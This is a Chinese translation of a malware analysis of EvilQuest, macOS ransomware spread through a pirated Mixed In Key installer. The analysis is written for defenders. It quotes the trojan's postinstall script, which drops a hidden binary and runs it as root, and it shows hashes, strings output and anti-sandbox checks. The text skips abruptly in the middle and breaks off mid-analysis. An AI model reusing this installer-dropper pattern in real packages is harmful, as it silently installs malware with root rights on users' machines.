# 交钱解密了还远控？新型MacOS勒索EvilQuest正在传播
##### 译文声明
本文是翻译文章，文章原作者 Patrick Wardle，文章来源：objective-see.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 背景
今天早些时候，[著名的](https://twitter.com/dineshdina04)恶意软件研究人员[Dinesh
Devadoss](https://twitter.com/dineshdina04)在推特上发布了一篇关于MacOS勒索软件的新推文，表示这是一种冒充Google软件更新程序的新型恶意软件。
MacOS平台的勒索比较少，但在此新型勒索开始出现时，[RansomWhere](https://objective-see.com/products/ransomwhere.html)表示他们可以很好的进行检测。所以我也准备分析分析该勒索，并且看看我的工具能够检测该勒索软件。
## 感染载体
从Dinesh的[推文中](https://twitter.com/dineshdina04/status/1277668001538433025)还暂时看不出来该勒索软件是如何感染macOS用户的。但是Malwarebytes的[Thomas
Reed](https://twitter.com/thomasareed?lang=en)指出该恶意软件是在流行torrent网站上共享的盗版macOS软件中发现的。
这是一种非常常见但是并不复杂的感染方式，目前有很多恶意软件都是通过这种方式进行传播。macOS恶意软件通过Torrent感染传播的其他示例包括：
[OSX.iWorm](https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf):
[OSX.Shlayer](https://www.intego.com/mac-security-blog/osxshlayer-new-mac-malware-comes-out-of-its-shell/):
Intego研究人员发现OSX /
Shlayer通过BitTorrent文件共享站点传播，当用户尝试选择链接来复制torrent磁铁链接时，它显示为伪造的Flash Player更新。
我们今天将要分析的样本打包在流行的DJ软件[Mixed In Key](https://mixedinkey.com/)(盗版)中，恶意软件未签名：
这意味着该软件在运行前MacOS将会弹框以获得用户的允许：
但是，使用盗版软件的macOS用户可能会忽略此警告并继续运行导致mac被感染。
## 分析
和上面讲的一样，该勒索软件是通过木马安装程序分发的。我们将深入研究的样本是通过名为Mixed In Key 8.dmg（SHA1:
98040c4d358a6fb9fed970df283a9b25f0ab393b）的磁盘映像分发的。
当前，该磁盘映像尚未由[VirusTotal](https://www.virustotal.com/gui/file/b34738e181a6119f23e930476ae949fc0c7c4ded6efa003019fa946c4e5b287a/detection)上的任何防病毒引擎标记（尽管随着AV引擎更新其签名数据库，这可能会更改
我们可以通过hdiutil挂载该磁盘映像：
    $ hdiutil attach ~/Downloads/Mixed In Key 8.dmg 
    /dev/disk2            GUID_partition_scheme           
    /dev/disk2s1          Apple_APFS                      
    /dev/disk3            EF57347C-0000-11AA-AA11-0030654 
    /dev/disk3s1          41504653-0000-11AA-AA11-0030654 /Volumes/Mixed In Key 8
挂载的磁盘映像（’/ Volumes / Mixed In Key 8 /‘）包含一个安装程序包Mixed In Key 8.pkg：
    $ ls /Volumes/Mixed In Key 8/
    Mixed In Key 8.pkg
我最喜欢的用于静态分析软件包（并从中提取文件）的工具是[Suspicious
Package](https://mothersruin.com/software/SuspiciousPackage/)
在使用Suspicious Package加载恶意软件之后，我们找到了（盗版的）Mixed In Key 8应用程序和名为”patch”的二进制文件：
单击“安装”选项卡后，我们找到安装后脚本：
    #!/bin/sh
    mkdir /Library/mixednkey
    mv /Applications/Utils/patch /Library/mixednkey/toolroomd
    rmdir /Application/Utils
    chmod +x /Library/mixednkey/toolroomd
    /Library/mixednkey/toolroomd &
很明显 ,在创建/Library/mixednkey目录后，程序会将一个二进制文件patch移动到该目录中，将其设置为可执行文件，然后启动它。
当安装程序在安装过程中请求root特权时，此脚本（以及toolroomd二进制文件）也将以root特权运行：
使用Suspicious Package我们可以同时对Mixed In Key 8应用程序和名为patch的二进制文件进行分析。由于Mixed In Key
8二进制文件仍然包含了开发人员的有效签名，因此它很可能是原始的且未经修改：
因此，我们将注意力转向toolroomd二进制文件。
toolroomd（原名为patch）是一个Mach-O格式的64位可执行应用程序。
    $ file patch
    patch: Mach-O 64-bit executable x86_64
    $ codesign -dvv patch 
    patch: code object is not signed at all
    $ shasum -a1 patch
    efbb681a61967e6f5a811f8649ec26efe16f50ae  patch
接下来，我们通过strings命令获取该应用程序的字符串：
    $ string - patch
    2Uy5DI3hMp7o0cq|T|14vHRz0000013
    0ZPKhq0rEeUJ0GhPle1joWN30000033
    0rzACG3Wr||n1dHnZL17MbWe0000013
    system.privilege.admin
    %s --reroot
    --silent
    --noroot
    --ignrp
    _generate_xkey
    /toidievitceffe/libtpyrc/tpyrc.c
    bits 
> 睡眠修补程序沙盒将修补睡眠功能，以试图克服使用时间延迟的恶意软件。作为响应，恶意软件将检查时间是否已加速。恶意软件将获取时间戳，进入睡眠状态，然后在唤醒时再次获取时间戳。时间戳记之间的时间差应与恶意软件被编程为休眠的时间长度相同。如果不是，则该恶意软件会知道它正在修补睡眠功能的环境中运行，这只会在沙箱中发生
这意味着，实际上，该功能更多是沙箱检查，并且可能无法检测到虚拟机。对于我们的调试工作而言，这是个好消息！
接下来，该恶意软件调用了一个名为extract_ei的方法，该方法尝试从自身的尾部读取0x20字节的数据，但是，由于unpack_trailer（由extract_ei调用）函数在对0DEADFACEh检查的时候返回了false。因此该样本中似乎并不存在符合的尾部数据。
    ;rcx: trailer data